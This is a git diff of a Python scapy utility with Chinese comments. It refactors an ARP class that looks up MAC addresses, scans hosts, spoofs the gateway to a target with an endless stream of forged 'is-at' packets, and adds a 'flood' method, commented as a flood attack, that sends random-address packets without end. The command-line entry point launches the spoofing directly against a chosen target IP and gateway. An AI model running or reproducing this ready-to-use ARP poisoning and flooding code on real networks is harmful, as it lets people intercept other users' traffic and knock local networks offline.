@@ -4,67 +4,117 @@ import sys
 from argparse import ArgumentParser
 from concurrent.futures.process import ProcessPoolExecutor
 
+from scapy.arch import get_windows_if_list
+from scapy.layers.inet import IP
 from scapy.layers.l2 import *
-sys.path.append('..')
-from Network.Tools import Tools
+from scapy.volatile import RandMAC, RandIP
+
 
 class Arp:
 
+    BoardCast = 'FF:FF:FF:FF:FF:FF'
+    Empty = '00:00:00:00:00:00'
 
     def __init__(self, ether_name, timeout, verbose):
         """
         ARP，因为二层协议，所以必须指定网卡
+
         :param ether_name: 网卡名
         :param timeout: 超时时间
         """
+
         self.__ether_name = ether_name
-        self.__mac, self.__ip = Tools.get_network_info(self.__ether_name)
         self.__timeout = timeout
         self.__verbose = verbose
 
+        if self.__ether_name:
+            if 'win32' in sys.platform.lower():
+                ifaces = get_windows_if_list()
+                for ether in ifaces:
+                    if ether['name'] == self.__ether_name:
+                        self.__mac = ether['mac']
+                        self.__ip4 = ether['ip']
+            else:
+                self.__mac = get_if_hwaddr(self.__ether_name)
+                self.__ip4 = get_if_addr(self.__ether_name)
+        else:
+            self.__ip4 = IP(dst='www.baidu.com').src
+            self.__mac = Ether().src
 
-    def who_has(self, pdst):
+    @classmethod
+    def get_arp(cls, op, sendermac, senderip4, targetmac, targetip4):
+        """
+        构造ARP数据包
+
+        :param op: ARP选项
+        :param sendermac: 发送者mac地址
+        :param senderip4: 发送者ip4地址
+        :param targetmac: 目标的mac地址
+        :param targetip4: 目标的ip4地址
+        :return: ARP数据包
+        """
+
+        return ARP(op=op,
+                   hwsrc=sendermac, psrc=senderip4,
+                   hwdst=targetmac, pdst=targetip4)
+
+    def who_has(self, targetip4):
         """
         arp协议中的who-has命令，使用arp协议获取指定ip地址的mac地址
-        :param: 目的地ip地址
+
+        :param targetip4: 目的地ip地址
         :return: 目标ip地址对应的mac地址
         """
-        arp_packet = Ether(dst=Tools.Ether_BoardCast,
-                           src=self.__mac) / \
-                     ARP(op='who-has', hwsrc=self.__mac, psrc=self.__ip,
-                         hwdst=Tools.Ether_Empty, pdst=pdst)
 
-        response = srp1(arp_packet, iface=self.__ether_name,
-                        timeout=self.__timeout, verbose=self.__verbose)
+        ether = Ether(src=self.__mac, dst=self.BoardCast)
+        arp = self.get_arp('who-has',
+                           sendermac=self.__mac, senderip4=self.__ip4,
+                           targetmac=self.Empty, targetip4=targetip4)
 
-        return response.getlayer(ARP).hwsrc if response else None
+        arp_packet = ether / arp
 
+        answer = srp1(arp_packet, iface=self.__ether_name,
+                      timeout=self.__timeout, verbose=self.__verbose)
 
-    def spoof(self, pdst, pfake, interval=0.2, hwdst=None):
+        return answer[ARP].hwsrc if answer else None
+
+    def flood(self):
+        """
+        泛洪攻击
+        """
+
+        randmac = RandMAC()
+        randip = RandIP()
+        arp_packet = Ether(src=randmac, dst=randmac) / IP(src=randip, dst=randip)
+        sendp(arp_packet, iface=self.__ether_name, count=sys.maxsize,
+              interval=0.2, verbose=self.__verbose)
+
+    def spoof(self, targetip4, targetmac, gatewayip4):
         """
         arp欺骗
-        :param pdst: 目的地ip地址
-        :param hwdst: 被攻击的主机mac地址
-        :param pfake: 伪装的ip地址，一般为网关地址
-        :param interval: arp请求发送间隔
+
+        :param targetip4: 目的地ip地址
+        :param targetmac: 被攻击的主机mac地址
+        :param gatewayip4: 网关地址（一般ARP欺骗都是伪造成网关）
         """
-        if hwdst is None:
-            hwdst = self.who_has(pdst)
 
-        arp_packet = Ether(src=self.__mac, dst=hwdst) / \
-                     ARP(op='is-at', hwsrc=self.__mac, psrc=pfake,
-                         hwdst=hwdst, pdst=pdst)
+        ether = Ether(src=self.__mac, dst=targetmac)
+        arp = self.get_arp(op='is-at',
+                           sendermac=self.__mac, senderip4=gatewayip4,
+                           targetmac=targetmac, targetip4=targetip4)
+        arp_packet = ether / arp
+
         sendp(arp_packet, iface=self.__ether_name, count=sys.maxsize,
-              interval=interval, verbose=self.__verbose)
+              interval=0.2, verbose=self.__verbose)
 
 
-    def list_who_has(self, pdst_list):
+    def list_who_has(self, ip4s):
         """
         请求一组ip地址，获取主机的mac地址
-        :param pdst_list
+
+        :param ip4s 目标主机列表
         :return: 存活主机的mac地址
         """
-        ip4s = list(ipaddress.ip_network(pdst_list).hosts())
 
         host = []
         for ip in ip4s:
@@ -99,32 +149,27 @@ class Arp:
         return host
 
 
-class InteractionArp:
-
-    @staticmethod
-    def run():
-        parser = ArgumentParser('arp tools')
-        parser.add_argument('-e', '--ether', type=str, required=True, help='the ether name')
-        parser.add_argument('-p', '--pdst',  type=str, required=True, help='the ip of destination host')
-        parser.add_argument('-t', '--timeout', type=float, default=1, help='the time for wait the response')
-        parser.add_argument('-i', '--interval', type=float, default=0.2, help='the interval of arp spool packet send')
-        parser.add_argument('-v', '--verbose', action='store_false', help='display debug information')
-
-        group = parser.add_mutually_exclusive_group()
-        group.add_argument('-f', '--pfake', type=str, help='the spool ip, always set as gateway')
-        group.add_argument('-s', '--scan', action='store_true', help='scan the active hosts')
-        args = parser.parse_args()
-
-        arp = Arp(args.ether, args.timeout, args.verbose)
-        if args.pfake:
-            arp.spoof(args.pdst, args.pfake, args.interval)
-        else:
-            hwsrc = arp.who_has(args.pdst)
-            if hwsrc:
-                print(f'ip = {args.pdst}, mac = {hwsrc}')
-            else:
-                print(f'ip = {args.pdst} do not find')
-
-
 if __name__ == '__main__':
-    InteractionArp.run()
+    parser = ArgumentParser('arp tools')
+
+    # 普通参数
+    parser.add_argument('-e', '--ether', type=str, help='网卡名称')
+    parser.add_argument('-p', '--targetip4', type=str, required=True, help='目标主机的ipv4')
+    parser.add_argument('-t', '--timeout', type=float, default=1, help='等待消息的回复延迟')
+    parser.add_argument('-v', '--verbose', default=False, action='store_true', help='是否打印地址信息')
+
+    group = parser.add_mutually_exclusive_group()
+    group.add_argument('-g', '--gwip4', type=str, help='伪造的ip地址，一般为网关地址')
+    group.add_argument('-s', '--scan', action='store_true', help='scan the active hosts')
+    args = parser.parse_args()
+
+    arp = Arp(args.ether, args.timeout, args.verbose)
+    if args.gwip4:
+        mac = arp.who_has(args.targetip4)
+        arp.spoof(args.targetip4, mac, args.gwip4)
+    else:
+        hwsrc = arp.who_has(args.targetip4)
+        if hwsrc:
+            print(f'ip = {args.targetip4}, mac = {hwsrc}')
+        else:
+            print(f'ip = {args.targetip4} do not find')
